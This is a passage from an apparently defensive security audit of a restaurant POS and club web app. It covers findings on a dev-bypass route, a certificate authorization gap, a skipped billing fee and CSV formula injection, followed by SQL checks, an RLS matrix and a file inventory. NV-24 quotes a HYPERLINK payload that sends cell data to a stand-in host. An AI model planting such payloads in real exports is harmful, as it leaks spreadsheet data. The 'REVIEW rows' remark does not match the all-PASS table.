decision. The delivery/reservations gap with a PIN set is a source-visible inconsistency either way.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Product intent is not fully source-visible. staff-roles.ts:55 and docs/VIBEY_AGENT_PLAN.md §5.4 make the master-PIN lock the intended gate for the cashier co-pilot. The owner must confirm whether a cashier at a venue without an admin PIN is meant to see P&L, dues and guest data. The PIN-set delivery/reservations exposure does not depend on this answer.
- **Owner check:** The owner confirms whether cashiers are meant to see P&L, dues, top guests, deliveries and reservations via the co-pilot. The owner also confirms whether production venues with the host Vibey flag on commonly run without an admin PIN, and whether the delivery/reservations tabs are meant to be lockable.
- **Remediation:** give each ToolDef the staff roles allowed to use it (e.g. CASHIER: live_tables, find_invoice only), drop disallowed calls for auth.staff in the gate node, and add delivery/reservations to DEFAULT_LOCKS or treat unknown modules as locked for staff.

#### NV-21 [P3]: Club dev shortcuts (unauthenticated dev-bypass, auto-approval, OTP 123456) reachable on the 0.0.0.0-bound dev server

- **Fingerprint:** `qc/club/dev-gates/node-env-only-on-lan-bound-dev-server`
- **Entry → sink:** `app/api/club/dev-bypass/route.ts:9` → `app/api/club/dev-bypass/route.ts:55`
- **What:** Under `npm run dev` (next dev -H 0.0.0.0 -p 3000), POST /api/club/dev-bypass has no auth: its only gate is NODE_ENV !== 'production' (so 'development', 'test' or unset all pass), and middleware.ts gates no /api/club path. With no session cookie it calls db.auth.admin.listUsers() and takes users[0]. It then uses the service-role client to upsert a vibers_accounts row, insert a consumed club_phone_otps row, and upsert viber_profiles with status 'approved' and a new pass number, overwriting any existing status, including 'revoked'. The response returns the profile (user_id, handle and alias taken from the email prefix, phone). An unauthenticated network peer therefore changes the first-listed auth user's Club membership and learns that user's id and email prefix. It does not get a membership for itself. A peer that has a Supabase session on that origin can approve its own account through the same route. In NODE_ENV === 'development', authenticated callers (requireUser) can also self-approve without staff review through /api/club/apply, which also skips phone verification, and through verifyOtp, which accepts code 123456 for any phone. All writes go to whichever Supabase project .env.local configures. Production builds refuse these paths. Whether the exposure is live depends on the network the dev machine runs on and which project .env.local targets, neither of which can be seen in source.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Two deployment facts are not visible in source, and .env.local must not be read: whether developers run `npm run dev` on reachable networks, and whether .env.local points the dev server at a shared or production Supabase project.
- **Owner check:** Owner checks, without changing anything, which Supabase project URL .env.local configures for local dev (dedicated local or throwaway vs shared or production), and whether dev machines run `npm run dev` on shared Wi-Fi or LAN with port 3000 open in the host firewall. If the project is shared or production and the port is reachable, treat it as a live exposure. In that case, from a second machine on the same network, GET http://<dev-ip>:3000/api/health to confirm reachability only. Do not call dev-bypass against a non-throwaway project.
- **Remediation:** require an explicit opt-in flag (e.g. CLUB_DEV_BYPASS=1), a signed-in session and a loopback-only Host for every dev shortcut; remove the listUsers fallback; bind the dev script to 127.0.0.1.

#### NV-22 [P3]: Club NOC action returns an existing certificate to any approved member before the creator/staff check

- **Fingerprint:** `qc/club/noc/issue-returns-existing-before-authz`
- **Entry → sink:** `app/api/club/events/[id]/action/route.ts:27` → `lib/club/ledger/noc.service.ts:23`
- **What:** POST /api/club/events/:id/action with {action:'noc'} needs only an approved Club member (requireMember, lib/club/auth.ts:36-45). It calls issueNoc(db, user.id, id, isStaff). issueNoc reads club_nocs by event_id through the service-role client (noc.service.ts:22) and returns the row (code, payload, signature, issued_at) at line 23. That return happens before the event is loaded and before the creator/staff check at line 25. issueNoc never calls canSee either. NOCs exist only for completed plans, and completed plans are visible to every member (events.service.ts:16-19), so their ids can be found. The signed payload (noc.service.ts:37-41) includes the creator's viber_id, the collected, fees and paid_out totals, and the names of partner properties. publicMembers/toPublicMember hide the handle of a member who masks with an alias (members.ts:10-15), so the payload exposes a masked creator's Viber ID. eventView limits nocCode to the creator, staff or a deal owner (event-view.service.ts:47) and limits the statement to creator or staff (:46). The returned code also opens the public /club/noc/<code> verification page (app/(club)/club/noc/[code]/page.tsx:14-29), so it can be passed on further. Source trace verified; an observed result is still required.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether this stale Club copy's /api/club routes are built into and served by the deployed Quad Computing app against a Supabase project that holds club_nocs rows is a deployment fact outside the repository.
- **Owner check:** Owner-observed, on a non-production or staging Club environment with dummy accounts: as dummy creator A, complete and settle a dummy plan and issue its NOC. Then, signed in as a different dummy approved member B (not staff, not a deal owner), send POST /api/club/events/<that id>/action with {"action":"noc"}. Record whether the response contains noc.code and noc.payload, or a 403. Also confirm whether the deployed QC build serves /api/club/* at all, or whether only the separate Vibers Club repo is deployed.
- **Remediation:** in issueNoc, load the event and enforce `isStaff || event.creator_id === actorId` (or deal owner, matching eventView) before the existing-row lookup returns.

#### NV-23 [P3]: A host can save settled POS bills without the per-bill platform fee by sending a table/room id or a non-SETTLED status

- **Fingerprint:** `qc/host-orders-create/platform-fee-skipped-by-client-table-room-or-status`
- **Entry → sink:** `app/api/host/orders/create/route.ts:14` → `app/api/host/orders/create/route.ts:65`
- **What:** POST /api/host/orders/create charges the PAYG bill fee (bill_generate, PAYG_BILL_FEE = 3) only for a 'counter bill', meaning the saved order has no table_id, no room_id and a status that is SETTLED after upper-casing (route.ts:65-66). All three values come from the request body. The route reaches settleAndVacateSession, whose chargeFee charges SETTLE_<id>, only when body.settlement is present (route.ts:31). The owner, or a CASHIER (staff-roles.ts:48), can therefore save and print a paid bill without a settlement block in any of three ways. (1) Send tableId set to any UUID that satisfies the orders.table_id FK; resolveTableTarget does not check that the table has a session. (2) Send a plain tableNumber such as 'T1' that matches one of the venue's own tables (resolve-table-id.util.ts:24-36). (3) Send roomId, or a status such as 'COMPLETED'. In each case the fee is skipped. The product treats COMPLETED as a fee-bearing final status elsewhere: update-status/route.ts:78-86 charges the same SETTLE_<id> fee when a status update moves an order into COMPLETED or SERVED (the DEPLETED list at line 34, claimed at lines 41-55). SETTLED does not trigger that fee there. A bill saved as SETTLED with a table or room can still be charged later if the host moves it into COMPLETED or SERVED through update-status, which they are free not to do. A bill saved directly as COMPLETED or SERVED cannot be charged that way, because the update-status claim matches nothing already in those states. Unless the host later settles a table session or makes that status move, the platform never charges for that bill. The route's own comment (route.ts:61-64) says this server-side charge exists because hosts could skip the earlier client-side call. Impact is limited to the host avoiding their own platform fee (₹3 per bill). This record does not establish cross-tenant access or guest harm: a foreign table UUID is accepted, but no source path reviewed shows cross-venue effects from it.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Owner confirmation is needed on whether any out-of-repo reconciliation bills platform fees for closed orders that have no SETTLE_<id> usage_ledger or venue_outstanding_bills row.
- **Owner check:** Owner-observed, on staging with a dummy PAYG venue: save a bill from the till with a table selected but without settling the table session. Leave the order untouched and check the venue wallet ledger and venue_outstanding_bills for a bill_generate entry with reference SETTLE_<order id>. If none appears, the fee was skipped. Do not run this against real venues.
- **Remediation:** charge the fee for every order this route leaves in a closed status (SETTLED or COMPLETED) when body.settlement is absent, keyed by feeReferenceFor(order.id) so a later settlement or status change stays idempotent. Alternatively, treat a bill as a table or room bill only after verifying an open session or stay for that venue.

#### NV-24 [P3]: Host dashboard 'Export CSV' writes guest-typed names without formula neutralization (CSV/formula injection)

- **Fingerprint:** `qc/report-csv/missing-formula-neutralization`
- **Entry → sink:** `app/api/guest/order/route.ts:87` → `components/host/workspaces/dashboard/reports/report-csv.ts:46`
- **What:** The host Reports 'Export CSV' button (ReportsSection.tsx:38) builds the file in the browser with report-csv.ts. Its cell() helper (lines 4-7) only quotes values containing a double quote, comma or LF. It never neutralizes a leading = + - @ tab or CR, and it does not quote a CR. The 'Top guest' rows (line 46) carry TopGuest.name. That value comes from venue_guest_ledger.guest_name, or from a dine_in_sessions/orders customer name, and an anonymous QR guest can set it. applyRequestIdentity (request-identity.ts:18-20) keeps the typed guest_name for a guest who is not signed in. submitGuestOrderOnce stores it as customer_name (submit-order.service.ts:190). On settlement it becomes guestName (settle-session.service.ts:153), which reaches recordLedgerVisit (settle-session.service.ts:319, ledger.service.ts:62-64). There the name is only whitespace-collapsed and cut to 60 characters before ledger_record_visit writes it. guestReport passes it on unchanged as TopGuest.name (guests-report.util.ts:52-56). A payload of up to 60 characters, such as =HYPERLINK("https://x.test/?"&B2,"Open") or =1+1, is therefore written to the CSV without an apostrophe prefix. Excel or Sheets may evaluate it as a formula when the owner opens the export. To appear, the guest must rank in the period's top 5 by spend among non-walk-in keys. A second path: a POST to /api/guest/events/interest that supplies a known guest's phone resolves to that guest's ledger key, and record_event_interest then overwrites guest_name (20261016000009_event_gender_quotas.sql:64). Category and dish rows also go through cell(). A dish name can fall back to client text (submit-order.service.ts:149) at price 0, but such a line ranks low. The server-side builders, for example csvCell in lib/utils/csv.ts and escapeCsvField in z-report-export.service.ts, already apply the guard. This client builder does not.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether a guest's name appears in the Top guest rows depends on venue data: the order must be settled and rank in the period's top 5 non-walk-in guests by spend, or the guest's ledger name must be overwritten through the event-interest path, which needs the target guest's phone and an open event. Whether the formula runs depends on the spreadsheet application and its warnings.
- **Owner check:** Owner-observed and read-only, on the staging venue's existing data. Nothing is ordered, settled or written. (1) With a read-only SELECT on that venue's database, count venue_guest_ledger rows for the business_id whose guest_name matches the regex '^[=+@-]'. (2) If the count is above zero, the owner downloads the existing report CSV from the host dashboard (Reports, Export CSV) for a period that contains such a guest, opens it in Excel or Google Sheets, and notes whether the Top guest cell shows a computed value or a formula or security warning. A computed value or warning confirms evaluation. If it shows the literal text, the export is not evaluated. (3) If the count is zero, the fact cannot be observed without creating data, so this record stays needs_validation and no traffic is sent. Separately, on the owner's own computer only, the owner creates a one-line CSV containing =1+1 and opens it in the same spreadsheet app. That tests the spreadsheet application, not the deployment.
- **Remediation:** make report-csv.ts use csvCell from lib/utils/csv.ts (apostrophe-prefix non-numeric text starting with = + - @ tab or CR, and also quote CR), and add a case to report-csv.test.ts with a top guest named '=1+1'.

## 3. 15-minute owner validation queries (read-only, run in the Supabase SQL editor)

```sql
-- P1 grant checks: any TRUE in anon_exec or auth_exec confirms that function is exposed to clients
SELECT p.oid::regprocedure AS fn,
       has_function_privilege('anon', p.oid, 'EXECUTE')          AS anon_exec,
       has_function_privilege('authenticated', p.oid, 'EXECUTE') AS auth_exec
FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace
WHERE n.nspname = 'public'
  AND p.proname IN ('deduct_venue_wallet_credits','update_kot_status','execute_atomic_bill_settlement',
                    'submit_guest_order_atomic','provision_host_business','verify_staff_pin',
                    'create_reservation_atomic','deduct_recipe_inventory_for_order','deduct_inventory_stock');

-- Default privileges that hand future functions/tables to anon
SELECT defaclrole::regrole, defaclobjtype, defaclacl FROM pg_default_acl;

-- Legacy master PIN default still present (NV for admin_pin)
SELECT count(*) FILTER (WHERE admin_pin = '0000') AS plain_0000 FROM public.businesses;

-- Cross-venue kitchen-ticket links already in data
SELECT count(*) FROM kitchen_tickets k JOIN orders o ON o.id = k.order_id WHERE o.business_id IS DISTINCT FROM k.business_id;

-- Shared table labels across venues (guest session venue swap)
SELECT table_number, count(DISTINCT business_id) FROM restaurant_tables GROUP BY 1 HAVING count(DISTINCT business_id) > 1;
```

To check the legacy JWT setting, deploy a throwaway SECURITY INVOKER function that returns `current_setting('request.jwt.claim.role', true)`. Call it with a normal user JWT, then drop it. A NULL result confirms the money-RPC ownership checks are skipped.

## 4. RLS policy verification matrix (all 104 tables)

**How this was produced:** a parent-side script read all 131 migrations in filename order as text. It tracks CREATE/DROP TABLE, ENABLE/DISABLE RLS, CREATE/DROP POLICY, the `DO $$ FOREACH ... EXECUTE format(...)` loops, and the `pg_policies` sweep in `20261005000002` that drops every open policy. Hunters h08 and h09 cross-checked the results by hand.

**Limits:** the matrix reflects the migration files. The live database may differ, because migrations are applied by hand and some were never applied (`20261008000005:4-14`). Table grants are not shown per table: `20261006000004` grants table DML to anon and authenticated globally, so RLS is the only table-level barrier.

**Result:** every table ends with RLS enabled. 67 tables are reachable by the service role only (RLS on, no client policy). 37 tables have client policies. No surviving policy is open to `anon` with `USING (true)`. 

| Table | RLS | Client policies (name: cmd → roles) | Verdict |
|---|---|---|---|
| bill_request_events | on | Hosts read bill request history: SELECT → public<br>Hosts update bill request history: UPDATE → public | PASS: tenant-scoped policies |
| business_categories | on | (none) | PASS: service-role only |
| businesses | on | Users can insert their own businesses.: INSERT → public<br>Users can update their own businesses.: UPDATE → public<br>Users can delete their own businesses.: DELETE → public<br>Users can view their own businesses.: SELECT → public<br>Hosts can update their own businesses.: UPDATE → public<br>Owner and staff read their venue: SELECT → authenticated<br>Owner creates their venue: INSERT → authenticated<br>Owner updates their venue: UPDATE → authenticated<br>Owner deletes their venue: DELETE → authenticated | PASS: tenant-scoped policies |
| catalog_items | on | Hosts can manage catalog items of their businesses: ALL → public | PASS: tenant-scoped policies |
| club_agreements | on | (none) | PASS: service-role only |
| club_campaigns | on | (none) | PASS: service-role only |
| club_consent_versions | on | (none) | PASS: service-role only |
| club_event_consents | on | (none) | PASS: service-role only |
| club_event_interest | on | (none) | PASS: service-role only |
| club_event_participants | on | (none) | PASS: service-role only |
| club_events | on | (none) | PASS: service-role only |
| club_follows | on | (none) | PASS: service-role only |
| club_journal | on | (none) | PASS: service-role only |
| club_ledger_accounts | on | (none) | PASS: service-role only |
| club_meetup_members | on | (none) | PASS: service-role only |
| club_meetups | on | (none) | PASS: service-role only |
| club_message_reactions | on | (none) | PASS: service-role only |
| club_messages | on | (none) | PASS: service-role only |
| club_moderation_log | on | (none) | PASS: service-role only |
| club_nocs | on | (none) | PASS: service-role only |
| club_notifications | on | (none) | PASS: service-role only |
| club_offer_revisions | on | (none) | PASS: service-role only |
| club_offers | on | (none) | PASS: service-role only |
| club_payments | on | (none) | PASS: service-role only |
| club_payouts | on | (none) | PASS: service-role only |
| club_phone_otps | on | (none) | PASS: service-role only |
| club_place_follows | on | (none) | PASS: service-role only |
| club_places | on | (none) | PASS: service-role only |
| club_post_comments | on | (none) | PASS: service-role only |
| club_post_likes | on | (none) | PASS: service-role only |
| club_posts | on | (none) | PASS: service-role only |
| club_presence | on | (none) | PASS: service-role only |
| club_reports | on | (none) | PASS: service-role only |
| club_room_members | on | (none) | PASS: service-role only |
| club_rooms | on | (none) | PASS: service-role only |
| club_settings | on | (none) | PASS: service-role only |
| club_staff | on | (none) | PASS: service-role only |
| club_stories | on | (none) | PASS: service-role only |
| club_story_views | on | (none) | PASS: service-role only |
| club_webhook_events | on | (none) | PASS: service-role only |
| dine_in_sessions | on | Hosts manage their dine_in_sessions: ALL → public<br>Host and staff access dine_in_sessions: ALL → authenticated | PASS: tenant-scoped policies |
| dish_likes | on | (none) | PASS: service-role only |
| escrow_ledger | on | (none) | PASS: service-role only |
| event_guest_leads | on | (none) | PASS: service-role only |
| guest_accounts | on | (none) | PASS: service-role only |
| guest_auth_sessions | on | (none) | PASS: service-role only |
| guest_sessions | on | (none) | PASS: service-role only |
| guest_wallet_claims | on | (none) | PASS: service-role only |
| guest_wallets | on | Host and staff access guest_wallets: ALL → authenticated<br>host_read_guest_wallets: SELECT → authenticated | PASS: tenant-scoped policies |
| inventory_audits | on | Hosts can insert and read inventory audits: ALL → public | PASS: tenant-scoped policies |
| inventory_logs | on | tenant_logs_policy: ALL → public<br>Host and staff access inventory_logs: ALL → authenticated | PASS: tenant-scoped policies |
| inventory_stock | on | Hosts can manage inventory for their catalog items: ALL → public | PASS: tenant-scoped policies |
| inventory_vendors | on | Host and staff access inventory_vendors: ALL → authenticated | PASS: tenant-scoped policies |
| item_options | on | Hosts can manage item options for their catalog items: ALL → public | PASS: tenant-scoped policies |
| kitchen_tickets | on | tenant_kitchen_policy: ALL → public<br>Host and staff access kitchen_tickets: ALL → authenticated | PASS: tenant-scoped policies |
| kot_status_logs | on | (none) | PASS: service-role only |
| ledger_visits | on | (none) | PASS: service-role only |
| lobby_messages | on | (none) | PASS: service-role only |
| lobby_post_likes | on | (none) | PASS: service-role only |
| lobby_post_replies | on | (none) | PASS: service-role only |
| lobby_posts | on | (none) | PASS: service-role only |
| locations | on | Users can view locations of their businesses.: SELECT → public<br>Users can insert locations for their businesses.: INSERT → public<br>Users can update locations of their businesses.: UPDATE → public<br>Users can delete locations of their businesses.: DELETE → public<br>Owner and staff read their locations: SELECT → authenticated<br>Owner creates their locations: INSERT → authenticated<br>Owner updates their locations: UPDATE → authenticated<br>Owner deletes their locations: DELETE → authenticated | PASS: tenant-scoped policies |
| operational_expenses | on | Hosts can access their own operational_expenses: ALL → public<br>Host and staff access operational_expenses: ALL → authenticated | PASS: tenant-scoped policies |
| order_items | on | Host and staff access order_items: ALL → authenticated | PASS: tenant-scoped policies |
| orders | on | Hosts can insert and read their own orders: ALL → public<br>tenant_orders_policy: ALL → public<br>Host and staff access orders: ALL → authenticated | PASS: tenant-scoped policies |
| private_chat_messages | on | (none) | PASS: service-role only |
| private_chats | on | (none) | PASS: service-role only |
| profiles | on | Users can view their own profile.: SELECT → public<br>Users can insert their own profile.: INSERT → public<br>Users can update their own profile.: UPDATE → public<br>Users can delete their own profile.: DELETE → public<br>People read their own profile: SELECT → authenticated<br>People create their own profile: INSERT → authenticated<br>People update their own profile: UPDATE → authenticated<br>People delete their own profile: DELETE → authenticated | PASS: tenant-scoped policies |
| promotions | on | Hosts can view their own promotions: SELECT → public<br>Hosts can insert their own promotions: INSERT → public<br>Hosts can update their own promotions: UPDATE → public<br>Hosts can delete their own promotions: DELETE → public | PASS: tenant-scoped policies |
| property_marketplace | on | (none) | PASS: service-role only |
| purchase_orders | on | Host and staff access purchase_orders: ALL → authenticated | PASS: tenant-scoped policies |
| raw_inventory_items | on | tenant_inventory_policy: ALL → public<br>Host and staff access raw_inventory_items: ALL → authenticated | PASS: tenant-scoped policies |
| recipe_ingredients | on | Hosts can full access recipe_ingredients: ALL → public | PASS: tenant-scoped policies |
| restaurant_tables | on | Hosts manage their own tables: ALL → public | PASS: tenant-scoped policies |
| room_categories | on | Hosts can manage room categories of their business: ALL → public | PASS: tenant-scoped policies |
| room_stay_logs | on | Hosts can manage room stay logs: ALL → public | PASS: tenant-scoped policies |
| rooms | on | Hosts can manage rooms of their business: ALL → public | PASS: tenant-scoped policies |
| staff_advances | on | Hosts can access their own staff_advances: ALL → public | PASS: tenant-scoped policies |
| staff_notifications | on | Host and staff access staff_notifications: ALL → authenticated | PASS: tenant-scoped policies |
| staff_profiles | on | Hosts can access their own staff_profiles: ALL → public | PASS: tenant-scoped policies |
| staff_salary_payments | on | Host and staff access staff_salary_payments: ALL → authenticated | PASS: tenant-scoped policies |
| table_invitations | on | (none) | PASS: service-role only |
| tables | on | (none) | PASS: service-role only |
| usage_ledger | on | host_read_usage_ledger: SELECT → authenticated | PASS: tenant-scoped policies |
| venue_guest_ledger | on | (none) | PASS: service-role only |
| venue_live_events | on | (none) | PASS: service-role only |
| venue_live_offers | on | (none) | PASS: service-role only |
| venue_offer_requests | on | (none) | PASS: service-role only |
| venue_operating_hours | on | owner manages hours: ALL → public | PASS: tenant-scoped policies |
| venue_order_counters | on | (none) | PASS: service-role only |
| venue_outstanding_bills | on | host_read_venue_outstanding_bills: SELECT → authenticated<br>Hosts can view own venue_outstanding_bills: SELECT → public | PASS: tenant-scoped policies |
| venue_photo_vault | on | (none) | PASS: service-role only |
| venue_reservations | on | owner manages reservations: ALL → public | PASS: tenant-scoped policies |
| venue_reviews | on | (none) | PASS: service-role only |
| venue_subscriptions | on | host_read_venue_subscriptions: SELECT → authenticated<br>Hosts can view own venue_subscriptions: SELECT → public | PASS: tenant-scoped policies |
| venue_topup_requests | on | host_read_venue_topup_requests: SELECT → authenticated<br>host_insert_pending_topup: INSERT → authenticated<br>Hosts can view own venue_topup_requests: SELECT → public<br>Hosts can insert own venue_topup_requests: INSERT → public | PASS: tenant-scoped policies |
| venue_vendors | on | (none) | PASS: service-role only |
| venue_wallets | on | host_read_venue_wallets: SELECT → authenticated<br>Hosts can view own venue_wallets: SELECT → public | PASS: tenant-scoped policies |
| viber_profile_categories | on | (none) | PASS: service-role only |
| viber_profiles | on | (none) | PASS: service-role only |
| vibers_accounts | on | (none) | PASS: service-role only |
| vibey_turns | on | (none) | PASS: service-role only |
| wallet_redemptions | on | host_read_wallet_redemptions: SELECT → authenticated | PASS: tenant-scoped policies |
| wallet_transactions | on | No updates on wallet_transactions: UPDATE → public<br>No deletes on wallet_transactions: DELETE → public<br>Host and staff access wallet_transactions: ALL → authenticated<br>host_read_wallet_transactions: SELECT → authenticated | PASS: tenant-scoped policies |

The `REVIEW` rows are the intentional public-menu reads, such as the `restaurant_tables` and `catalog_items` policies from `20261006000011_public_guest_menu.sql`. h09 recorded them as hardening because they let anon read every venue's tables and menu rows.

**Function-level gaps (not shown in the table matrix):** the RLS matrix covers only tables. The P1 risks sit in SECURITY DEFINER functions, which run with owner rights and therefore ignore RLS. They are listed in section 3.

## 5. File inventory (Pass/Fail per file)

Key to the Status column:
- **PASS:** reviewed in an owned check; no lead found in the source.
- **FLAG:** the file is on the trace of the listed needs-validation lead(s).
- **NOT REVIEWED:** in scope but not opened by any check. These are landing, showcase and brand files, barrels and the test fake.

Counts: PASS 693, FLAG 53, NOT REVIEWED 17 (out of 763 in-scope files).

<details><summary><b>app/(club)</b> (25 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/(club)/club/admin/page.tsx` | PASS |  |
| `app/(club)/club/apply/page.tsx` | PASS |  |
| `app/(club)/club/chat/[roomId]/page.tsx` | PASS |  |
| `app/(club)/club/chat/page.tsx` | PASS |  |
| `app/(club)/club/community/page.tsx` | PASS |  |
| `app/(club)/club/events/[id]/edit/page.tsx` | PASS |  |
| `app/(club)/club/events/[id]/page.tsx` | PASS |  |
| `app/(club)/club/events/new/page.tsx` | PASS |  |
| `app/(club)/club/events/page.tsx` | PASS |  |
| `app/(club)/club/explore/page.tsx` | PASS |  |
| `app/(club)/club/meetups/[id]/page.tsx` | PASS |  |
| `app/(club)/club/members/[id]/page.tsx` | PASS |  |
| `app/(club)/club/noc/[code]/page.tsx` | PASS |  |
| `app/(club)/club/notifications/page.tsx` | PASS |  |
| `app/(club)/club/offers/[id]/page.tsx` | PASS |  |
| `app/(club)/club/page.tsx` | PASS |  |
| `app/(club)/club/pass/page.tsx` | PASS |  |
| `app/(club)/club/places/[id]/page.tsx` | PASS |  |
| `app/(club)/club/places/page.tsx` | PASS |  |
| `app/(club)/club/properties/[id]/edit/page.tsx` | PASS |  |
| `app/(club)/club/properties/[id]/page.tsx` | PASS |  |
| `app/(club)/club/properties/new/page.tsx` | PASS |  |
| `app/(club)/club/properties/page.tsx` | PASS |  |
| `app/(club)/join/page.tsx` | PASS |  |
| `app/(club)/layout.tsx` | PASS |  |

</details>

<details><summary><b>app/(guest)</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/(guest)/menu/layout.tsx` | PASS |  |
| `app/(guest)/menu/page.tsx` | PASS |  |

</details>

<details><summary><b>app/admin</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/admin/topup-desk/page.tsx` | PASS |  |

</details>

<details><summary><b>app/api/admin</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/admin/topup-requests/route.ts` | PASS |  |

</details>

<details><summary><b>app/api/auth</b> (2 files: 1 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/auth/host-access/route.ts` | PASS |  |
| `app/api/auth/staff-pin/route.ts` | FLAG | NV-18 |

</details>

<details><summary><b>app/api/club</b> (61 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/club/activity/route.ts` | PASS |  |
| `app/api/club/admin/applications/route.ts` | PASS |  |
| `app/api/club/admin/campaigns/route.ts` | PASS |  |
| `app/api/club/admin/categories/route.ts` | PASS |  |
| `app/api/club/admin/events/route.ts` | PASS |  |
| `app/api/club/admin/members/route.ts` | PASS |  |
| `app/api/club/admin/overview/route.ts` | PASS |  |
| `app/api/club/admin/payouts/route.ts` | PASS |  |
| `app/api/club/admin/properties/route.ts` | PASS |  |
| `app/api/club/admin/reports/route.ts` | PASS |  |
| `app/api/club/admin/settings/route.ts` | PASS |  |
| `app/api/club/admin/staff/route.ts` | PASS |  |
| `app/api/club/agreements/[id]/deposit/route.ts` | PASS |  |
| `app/api/club/apply/route.ts` | PASS |  |
| `app/api/club/bubbles/route.ts` | PASS |  |
| `app/api/club/categories/route.ts` | PASS |  |
| `app/api/club/comments/[id]/route.ts` | PASS |  |
| `app/api/club/consent/route.ts` | PASS |  |
| `app/api/club/dev-bypass/route.ts` | FLAG | NV-21 |
| `app/api/club/events/[id]/action/route.ts` | FLAG | NV-22 |
| `app/api/club/events/[id]/route.ts` | PASS |  |
| `app/api/club/events/route.ts` | PASS |  |
| `app/api/club/explore/route.ts` | PASS |  |
| `app/api/club/me/route.ts` | PASS |  |
| `app/api/club/meetups/[id]/route.ts` | PASS |  |
| `app/api/club/meetups/route.ts` | PASS |  |
| `app/api/club/members/[id]/follow/route.ts` | PASS |  |
| `app/api/club/members/[id]/network/route.ts` | PASS |  |
| `app/api/club/members/[id]/route.ts` | PASS |  |
| `app/api/club/messages/[id]/reactions/route.ts` | PASS |  |
| `app/api/club/notifications/route.ts` | PASS |  |
| `app/api/club/offers/[id]/route.ts` | PASS |  |
| `app/api/club/offers/route.ts` | PASS |  |
| `app/api/club/otp/send/route.ts` | PASS |  |
| `app/api/club/otp/verify/route.ts` | PASS |  |
| `app/api/club/payments/verify/route.ts` | PASS |  |
| `app/api/club/payments/webhook/route.ts` | PASS |  |
| `app/api/club/payouts/route.ts` | PASS |  |
| `app/api/club/places/[id]/follow/route.ts` | PASS |  |
| `app/api/club/places/[id]/route.ts` | PASS |  |
| `app/api/club/places/route.ts` | PASS |  |
| `app/api/club/posts/[id]/comments/route.ts` | PASS |  |
| `app/api/club/posts/[id]/like/route.ts` | PASS |  |
| `app/api/club/posts/[id]/route.ts` | PASS |  |
| `app/api/club/posts/route.ts` | PASS |  |
| `app/api/club/presence/heartbeat/route.ts` | PASS |  |
| `app/api/club/presence/leave/route.ts` | PASS |  |
| `app/api/club/presence/route.ts` | PASS |  |
| `app/api/club/properties/[id]/route.ts` | PASS |  |
| `app/api/club/properties/mine/route.ts` | PASS |  |
| `app/api/club/properties/route.ts` | PASS |  |
| `app/api/club/reports/route.ts` | PASS |  |
| `app/api/club/rooms/[id]/messages/route.ts` | PASS |  |
| `app/api/club/rooms/[id]/read/route.ts` | PASS |  |
| `app/api/club/rooms/dm/route.ts` | PASS |  |
| `app/api/club/rooms/route.ts` | PASS |  |
| `app/api/club/stories/[id]/route.ts` | PASS |  |
| `app/api/club/stories/[id]/view/route.ts` | PASS |  |
| `app/api/club/stories/[id]/viewers/route.ts` | PASS |  |
| `app/api/club/stories/route.ts` | PASS |  |
| `app/api/club/uploads/route.ts` | PASS |  |

</details>

<details><summary><b>app/api/guest</b> (41 files: 5 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/guest/auth/handle-check/route.ts` | PASS |  |
| `app/api/guest/auth/login/route.ts` | FLAG | NV-12 |
| `app/api/guest/auth/logout/route.ts` | PASS |  |
| `app/api/guest/auth/me/route.ts` | PASS |  |
| `app/api/guest/auth/photo/route.ts` | PASS |  |
| `app/api/guest/auth/pin/recover/route.ts` | PASS |  |
| `app/api/guest/auth/pin/route.ts` | FLAG | NV-11 |
| `app/api/guest/auth/profile/route.ts` | PASS |  |
| `app/api/guest/auth/signup/route.ts` | PASS |  |
| `app/api/guest/auth/vibers-profile/route.ts` | PASS |  |
| `app/api/guest/bill/route.ts` | PASS |  |
| `app/api/guest/call-staff/route.ts` | PASS |  |
| `app/api/guest/catalog/route.ts` | PASS |  |
| `app/api/guest/delivery-info/route.ts` | PASS |  |
| `app/api/guest/delivery/route.ts` | PASS |  |
| `app/api/guest/events/interest/route.ts` | FLAG | NV-13 |
| `app/api/guest/events/prefill/route.ts` | PASS |  |
| `app/api/guest/events/route.ts` | PASS |  |
| `app/api/guest/invoices/route.ts` | PASS |  |
| `app/api/guest/lobby/posts/[id]/like/route.ts` | PASS |  |
| `app/api/guest/lobby/posts/[id]/replies/route.ts` | PASS |  |
| `app/api/guest/lobby/posts/[id]/route.ts` | PASS |  |
| `app/api/guest/lobby/posts/route.ts` | PASS |  |
| `app/api/guest/lobby/route.ts` | PASS |  |
| `app/api/guest/menu/info/route.ts` | PASS |  |
| `app/api/guest/menu/likes/route.ts` | PASS |  |
| `app/api/guest/menu/route.ts` | PASS |  |
| `app/api/guest/offers/requests/[id]/route.ts` | PASS |  |
| `app/api/guest/offers/requests/route.ts` | PASS |  |
| `app/api/guest/onboard/route.ts` | PASS |  |
| `app/api/guest/order/route.ts` | FLAG | NV-02, NV-14, NV-24 |
| `app/api/guest/reserve/route.ts` | PASS |  |
| `app/api/guest/reserve/tables/route.ts` | PASS |  |
| `app/api/guest/reviews/route.ts` | PASS |  |
| `app/api/guest/session/route.ts` | FLAG | NV-03 |
| `app/api/guest/slots/route.ts` | PASS |  |
| `app/api/guest/venue-status/route.ts` | PASS |  |
| `app/api/guest/vibey/route.ts` | PASS |  |
| `app/api/guest/wallet/history/route.ts` | PASS |  |
